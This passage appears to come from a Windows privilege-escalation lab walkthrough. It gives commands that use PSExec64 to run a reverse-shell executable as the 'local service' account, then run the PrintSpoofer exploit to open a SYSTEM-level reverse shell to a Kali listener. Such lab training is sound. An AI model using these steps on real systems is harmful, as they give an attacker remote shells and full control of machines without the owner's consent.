Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -> run as administrator) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account:  

`C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe`

Start another listener on Kali.

Now, in the "local service" reverse shell you triggered, run the PrintSpoofer exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):

`C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i`
